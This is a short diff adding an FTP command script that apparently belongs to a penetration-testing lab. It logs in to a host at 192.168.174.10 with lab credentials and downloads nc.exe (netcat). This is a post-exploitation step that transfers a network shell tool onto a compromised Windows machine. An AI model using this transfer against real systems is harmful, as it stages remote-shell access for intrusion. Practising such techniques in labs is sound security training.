@@ -1,0 +1,7 @@
+type ftp.txt
+open 192.168.174.10 21
+USER offsec
+kali
+bin
+GET nc.exe
+bye
